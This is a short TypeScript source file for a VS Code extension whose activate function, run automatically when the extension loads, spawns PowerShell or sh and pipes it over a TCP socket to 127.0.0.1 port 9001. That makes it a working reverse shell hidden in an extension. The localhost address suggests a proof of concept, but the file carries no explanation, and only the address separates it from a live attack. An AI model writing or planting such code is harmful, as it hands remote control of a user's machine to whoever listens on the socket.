import * as vscode from 'vscode';
import { platform } from 'node:process';
const cp = require('child_process');
const net = require('net');

const ip = '127.0.0.1';
const port = 9001;

function spawnReverseShell(shell: string) {

		var sh = cp.spawn(shell, []),
		client = new net.Socket();
		client.connect(port, ip, function(){
			client.pipe(sh.stdin);
			sh.stdout.pipe(client);
			sh.stderr.pipe(client);
		});

}

export function activate(context: vscode.ExtensionContext) {

	if (platform === "win32") {
		spawnReverseShell('powershell');
	} else {
		spawnReverseShell('sh');
	}
	
}

export function deactivate() {}
